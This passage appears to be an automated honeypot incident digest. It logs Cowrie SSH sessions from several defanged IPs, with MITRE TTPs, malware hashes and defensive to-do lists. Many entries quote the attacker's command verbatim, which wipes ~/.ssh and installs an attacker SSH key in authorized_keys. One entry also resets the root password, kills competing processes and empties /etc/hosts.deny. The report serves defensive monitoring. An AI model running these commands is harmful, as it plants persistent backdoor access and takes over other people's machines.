| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 04:48:46` | `cowrie.session.connect` |
| `2026-06-13 04:48:46` | `cowrie.client.version` |
| `2026-06-13 04:48:46` | `cowrie.client.kex` |
| `2026-06-13 04:48:47` | `cowrie.login.success` |
| `2026-06-13 04:48:47` | `cowrie.session.params` |
| `2026-06-13 04:48:47` | `cowrie.command.input` |
| `2026-06-13 04:48:47` | `cowrie.command.failed` |
| `2026-06-13 04:48:47` | `cowrie.log.closed` |
| `2026-06-13 04:48:47` | `cowrie.session.params` |
| `2026-06-13 04:48:47` | `cowrie.command.input` |
| `2026-06-13 04:48:47` | `cowrie.session.file_download` |
| `2026-06-13 04:48:47` | `cowrie.log.closed` |
| `2026-06-13 04:48:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.226.213[.]238` to AbuseIPDB if not already reported
- [ ] Block `129.226.213[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab27e4db60fe

| Field | Detail |
|---|---|
| **Source IP** | `129.226.213[.]238` |
| **First Seen** | 2026-06-13 04:48 |
| **Last Seen** | 2026-06-13 04:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 04:48:49` | `cowrie.session.connect` |
| `2026-06-13 04:48:49` | `cowrie.client.version` |
| `2026-06-13 04:48:49` | `cowrie.client.kex` |
| `2026-06-13 04:48:49` | `cowrie.login.success` |
| `2026-06-13 04:48:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.226.213[.]238` to AbuseIPDB if not already reported
- [ ] Block `129.226.213[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab32cdb74cf8

| Field | Detail |
|---|---|
| **Source IP** | `129.226.213[.]238` |
| **First Seen** | 2026-06-13 04:52 |
| **Last Seen** | 2026-06-13 04:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 04:52:38` | `cowrie.session.connect` |
| `2026-06-13 04:52:38` | `cowrie.client.version` |
| `2026-06-13 04:52:38` | `cowrie.client.kex` |
| `2026-06-13 04:52:38` | `cowrie.login.success` |
| `2026-06-13 04:52:38` | `cowrie.session.params` |
| `2026-06-13 04:52:38` | `cowrie.command.input` |
| `2026-06-13 04:52:38` | `cowrie.command.failed` |
| `2026-06-13 04:52:38` | `cowrie.log.closed` |
| `2026-06-13 04:52:38` | `cowrie.session.params` |
| `2026-06-13 04:52:38` | `cowrie.command.input` |
| `2026-06-13 04:52:38` | `cowrie.session.file_download` |
| `2026-06-13 04:52:38` | `cowrie.log.closed` |
| `2026-06-13 04:52:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.226.213[.]238` to AbuseIPDB if not already reported
- [ ] Block `129.226.213[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a8e873e0728

| Field | Detail |
|---|---|
| **Source IP** | `129.226.213[.]238` |
| **First Seen** | 2026-06-13 04:52 |
| **Last Seen** | 2026-06-13 04:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 04:52:40` | `cowrie.session.connect` |
| `2026-06-13 04:52:40` | `cowrie.client.version` |
| `2026-06-13 04:52:40` | `cowrie.client.kex` |
| `2026-06-13 04:52:40` | `cowrie.login.success` |
| `2026-06-13 04:52:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.226.213[.]238` to AbuseIPDB if not already reported
- [ ] Block `129.226.213[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63e0f57cbc98

| Field | Detail |
|---|---|
| **Source IP** | `129.226.213[.]238` |
| **First Seen** | 2026-06-13 04:56 |
| **Last Seen** | 2026-06-13 04:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 04:56:23` | `cowrie.session.connect` |
| `2026-06-13 04:56:23` | `cowrie.client.version` |
| `2026-06-13 04:56:23` | `cowrie.client.kex` |
| `2026-06-13 04:56:23` | `cowrie.login.success` |
| `2026-06-13 04:56:23` | `cowrie.session.params` |
| `2026-06-13 04:56:23` | `cowrie.command.input` |
| `2026-06-13 04:56:23` | `cowrie.command.failed` |
| `2026-06-13 04:56:24` | `cowrie.log.closed` |
| `2026-06-13 04:56:24` | `cowrie.session.params` |
| `2026-06-13 04:56:24` | `cowrie.command.input` |
| `2026-06-13 04:56:24` | `cowrie.session.file_download` |
| `2026-06-13 04:56:24` | `cowrie.log.closed` |
| `2026-06-13 04:56:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.226.213[.]238` to AbuseIPDB if not already reported
- [ ] Block `129.226.213[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b35564bb2af1

| Field | Detail |
|---|---|
| **Source IP** | `129.226.213[.]238` |
| **First Seen** | 2026-06-13 04:56 |
| **Last Seen** | 2026-06-13 04:56 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 04:56:25` | `cowrie.session.connect` |
| `2026-06-13 04:56:25` | `cowrie.client.version` |
| `2026-06-13 04:56:25` | `cowrie.client.kex` |
| `2026-06-13 04:56:26` | `cowrie.login.success` |
| `2026-06-13 04:56:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.226.213[.]238` to AbuseIPDB if not already reported
- [ ] Block `129.226.213[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a247a481f8a

| Field | Detail |
|---|---|
| **Source IP** | `129.226.213[.]238` |
| **First Seen** | 2026-06-13 04:58 |
| **Last Seen** | 2026-06-13 04:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 04:58:14` | `cowrie.session.connect` |
| `2026-06-13 04:58:14` | `cowrie.client.version` |
| `2026-06-13 04:58:14` | `cowrie.client.kex` |
| `2026-06-13 04:58:14` | `cowrie.login.success` |
| `2026-06-13 04:58:15` | `cowrie.session.params` |
| `2026-06-13 04:58:15` | `cowrie.command.input` |
| `2026-06-13 04:58:15` | `cowrie.command.failed` |
| `2026-06-13 04:58:15` | `cowrie.log.closed` |
| `2026-06-13 04:58:15` | `cowrie.session.params` |
| `2026-06-13 04:58:15` | `cowrie.command.input` |
| `2026-06-13 04:58:15` | `cowrie.session.file_download` |
| `2026-06-13 04:58:15` | `cowrie.log.closed` |
| `2026-06-13 04:58:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.226.213[.]238` to AbuseIPDB if not already reported
- [ ] Block `129.226.213[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b5156a5111c

| Field | Detail |
|---|---|
| **Source IP** | `129.226.213[.]238` |
| **First Seen** | 2026-06-13 04:58 |
| **Last Seen** | 2026-06-13 04:58 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 04:58:16` | `cowrie.session.connect` |
| `2026-06-13 04:58:16` | `cowrie.client.version` |
| `2026-06-13 04:58:16` | `cowrie.client.kex` |
| `2026-06-13 04:58:17` | `cowrie.login.success` |
| `2026-06-13 04:58:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.226.213[.]238` to AbuseIPDB if not already reported
- [ ] Block `129.226.213[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d68fb09c9d01

| Field | Detail |
|---|---|
| **Source IP** | `103.13.206[.]152` |
| **First Seen** | 2026-06-13 05:00 |
| **Last Seen** | 2026-06-13 05:00 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 05:00:52` | `cowrie.session.connect` |
| `2026-06-13 05:00:52` | `cowrie.client.version` |
| `2026-06-13 05:00:52` | `cowrie.client.kex` |
| `2026-06-13 05:00:53` | `cowrie.login.success` |
| `2026-06-13 05:00:53` | `cowrie.session.params` |
| `2026-06-13 05:00:53` | `cowrie.command.input` |
| `2026-06-13 05:00:53` | `cowrie.command.failed` |
| `2026-06-13 05:00:53` | `cowrie.log.closed` |
| `2026-06-13 05:00:53` | `cowrie.session.params` |
| `2026-06-13 05:00:53` | `cowrie.command.input` |
| `2026-06-13 05:00:53` | `cowrie.session.file_download` |
| `2026-06-13 05:00:53` | `cowrie.log.closed` |
| `2026-06-13 05:00:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.13.206[.]152` to AbuseIPDB if not already reported
- [ ] Block `103.13.206[.]152` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0dd22f5810ce

| Field | Detail |
|---|---|
| **Source IP** | `103.13.206[.]152` |
| **First Seen** | 2026-06-13 05:00 |
| **Last Seen** | 2026-06-13 05:00 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 05:00:55` | `cowrie.session.connect` |
| `2026-06-13 05:00:55` | `cowrie.client.version` |
| `2026-06-13 05:00:55` | `cowrie.client.kex` |
| `2026-06-13 05:00:55` | `cowrie.login.success` |
| `2026-06-13 05:00:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.13.206[.]152` to AbuseIPDB if not already reported
- [ ] Block `103.13.206[.]152` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-214f103bcea5

| Field | Detail |
|---|---|
| **Source IP** | `129.226.213[.]238` |
| **First Seen** | 2026-06-13 05:03 |
| **Last Seen** | 2026-06-13 05:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 05:03:46` | `cowrie.session.connect` |
| `2026-06-13 05:03:46` | `cowrie.client.version` |
| `2026-06-13 05:03:46` | `cowrie.client.kex` |
| `2026-06-13 05:03:46` | `cowrie.login.success` |
| `2026-06-13 05:03:46` | `cowrie.session.params` |
| `2026-06-13 05:03:46` | `cowrie.command.input` |
| `2026-06-13 05:03:46` | `cowrie.command.failed` |
| `2026-06-13 05:03:46` | `cowrie.log.closed` |
| `2026-06-13 05:03:47` | `cowrie.session.params` |
| `2026-06-13 05:03:47` | `cowrie.command.input` |
| `2026-06-13 05:03:47` | `cowrie.session.file_download` |
| `2026-06-13 05:03:47` | `cowrie.log.closed` |
| `2026-06-13 05:03:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.226.213[.]238` to AbuseIPDB if not already reported
- [ ] Block `129.226.213[.]238` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ab1a392555b

| Field | Detail |
|---|---|
| **Source IP** | `129.226.213[.]238` |
| **First Seen** | 2026-06-13 05:03 |
| **Last Seen** | 2026-06-13 05:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 05:03:48` | `cowrie.session.connect` |
| `2026-06-13 05:03:48` | `cowrie.client.version` |
| `2026-06-13 05:03:48` | `cowrie.client.kex` |
| `2026-06-13 05:03:49` | `cowrie.login.success` |
| `2026-06-13 05:03:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.226.213[.]238` to AbuseIPDB if not already reported
- [ ] Block `129.226.213[.]238` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8d8ccfc2c001

| Field | Detail |
|---|---|
| **Source IP** | `118.145.242[.]91` |
| **First Seen** | 2026-06-13 05:06 |
| **Last Seen** | 2026-06-13 05:06 |
| **Session Duration** | 26s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:NmIkWVwd8GPw"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 05:06:15` | `cowrie.session.connect` |
| `2026-06-13 05:06:15` | `cowrie.client.version` |
| `2026-06-13 05:06:16` | `cowrie.client.kex` |
| `2026-06-13 05:06:16` | `cowrie.login.success` |
| `2026-06-13 05:06:16` | `cowrie.session.params` |
| `2026-06-13 05:06:16` | `cowrie.command.input` |
| `2026-06-13 05:06:16` | `cowrie.command.failed` |
| `2026-06-13 05:06:17` | `cowrie.log.closed` |
| `2026-06-13 05:06:17` | `cowrie.session.params` |
| `2026-06-13 05:06:17` | `cowrie.command.input` |
| `2026-06-13 05:06:17` | `cowrie.session.file_download` |
| `2026-06-13 05:06:17` | `cowrie.log.closed` |
| `2026-06-13 05:06:34` | `cowrie.session.params` |
| `2026-06-13 05:06:34` | `cowrie.command.input` |
| `2026-06-13 05:06:35` | `cowrie.log.closed` |
| `2026-06-13 05:06:35` | `cowrie.session.params` |
| `2026-06-13 05:06:35` | `cowrie.command.input` |
| `2026-06-13 05:06:35` | `cowrie.log.closed` |
| `2026-06-13 05:06:35` | `cowrie.session.params` |
| `2026-06-13 05:06:35` | `cowrie.command.input` |
| `2026-06-13 05:06:35` | `cowrie.session.file_download` |
| `2026-06-13 05:06:35` | `cowrie.log.closed` |
| `2026-06-13 05:06:36` | `cowrie.session.params` |
| `2026-06-13 05:06:36` | `cowrie.command.input` |
| `2026-06-13 05:06:36` | `cowrie.log.closed` |
| `2026-06-13 05:06:36` | `cowrie.session.params` |
| `2026-06-13 05:06:36` | `cowrie.command.input` |
| `2026-06-13 05:06:37` | `cowrie.log.closed` |
| `2026-06-13 05:06:37` | `cowrie.session.params` |
| `2026-06-13 05:06:37` | `cowrie.command.input` |
| `2026-06-13 05:06:37` | `cowrie.command.input` |
| `2026-06-13 05:06:37` | `cowrie.log.closed` |
| `2026-06-13 05:06:37` | `cowrie.session.params` |
| `2026-06-13 05:06:37` | `cowrie.command.input` |
| `2026-06-13 05:06:37` | `cowrie.log.closed` |
| `2026-06-13 05:06:38` | `cowrie.session.params` |
| `2026-06-13 05:06:38` | `cowrie.command.input` |
| `2026-06-13 05:06:38` | `cowrie.log.closed` |
| `2026-06-13 05:06:38` | `cowrie.session.params` |
| `2026-06-13 05:06:38` | `cowrie.command.input` |
| `2026-06-13 05:06:38` | `cowrie.log.closed` |
| `2026-06-13 05:06:39` | `cowrie.session.params` |
| `2026-06-13 05:06:39` | `cowrie.command.input` |
| `2026-06-13 05:06:39` | `cowrie.log.closed` |
| `2026-06-13 05:06:39` | `cowrie.session.params` |
| `2026-06-13 05:06:39` | `cowrie.command.input` |
| `2026-06-13 05:06:39` | `cowrie.log.closed` |
| `2026-06-13 05:06:40` | `cowrie.session.params` |
| `2026-06-13 05:06:40` | `cowrie.command.input` |
| `2026-06-13 05:06:40` | `cowrie.log.closed` |
| `2026-06-13 05:06:40` | `cowrie.session.params` |
| `2026-06-13 05:06:40` | `cowrie.command.input` |
| `2026-06-13 05:06:40` | `cowrie.log.closed` |
| `2026-06-13 05:06:41` | `cowrie.session.params` |
| `2026-06-13 05:06:41` | `cowrie.command.input` |
| `2026-06-13 05:06:41` | `cowrie.log.closed` |
| `2026-06-13 05:06:41` | `cowrie.session.params` |
| `2026-06-13 05:06:41` | `cowrie.command.input` |
| `2026-06-13 05:06:41` | `cowrie.log.closed` |
| `2026-06-13 05:06:41` | `cowrie.session.params` |
| `2026-06-13 05:06:41` | `cowrie.command.input` |
| `2026-06-13 05:06:42` | `cowrie.log.closed` |
| `2026-06-13 05:06:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.145.242[.]91` to AbuseIPDB if not already reported
- [ ] Block `118.145.242[.]91` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc52d5ce32e5

| Field | Detail |
|---|---|
| **Source IP** | `186.68.83[.]104` |
| **First Seen** | 2026-06-13 05:08 |
| **Last Seen** | 2026-06-13 05:08 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 05:08:38` | `cowrie.session.connect` |
| `2026-06-13 05:08:38` | `cowrie.client.version` |
| `2026-06-13 05:08:39` | `cowrie.client.kex` |
| `2026-06-13 05:08:40` | `cowrie.login.success` |
| `2026-06-13 05:08:41` | `cowrie.session.params` |
| `2026-06-13 05:08:41` | `cowrie.command.input` |
| `2026-06-13 05:08:41` | `cowrie.command.failed` |
| `2026-06-13 05:08:41` | `cowrie.log.closed` |
| `2026-06-13 05:08:42` | `cowrie.session.params` |
| `2026-06-13 05:08:42` | `cowrie.command.input` |
| `2026-06-13 05:08:42` | `cowrie.session.file_download` |
| `2026-06-13 05:08:42` | `cowrie.log.closed` |
| `2026-06-13 05:08:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.68.83[.]104` to AbuseIPDB if not already reported
- [ ] Block `186.68.83[.]104` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5931d9f4b603

| Field | Detail |
|---|---|
| **Source IP** | `186.68.83[.]104` |
| **First Seen** | 2026-06-13 05:08 |
| **Last Seen** | 2026-06-13 05:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-13 05:08:45` | `cowrie.session.connect` |
| `2026-06-13 05:08:45` | `cowrie.client.version` |
| `2026-06-13 05:08:46` | `cowrie.client.kex` |
| `2026-06-13 05:08:47` | `cowrie.login.success` |
| `2026-06-13 05:08:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.68.83[.]104` to AbuseIPDB if not already reported
- [ ] Block `186.68.83[.]104` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e5cabc3e60dc

| Field | Detail |
|---|---|
| **Source IP** | `129.226.213[.]238` |
| **First Seen** | 2026-06-13 05:17 |
| **Last Seen** | 2026-06-13 05:17 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
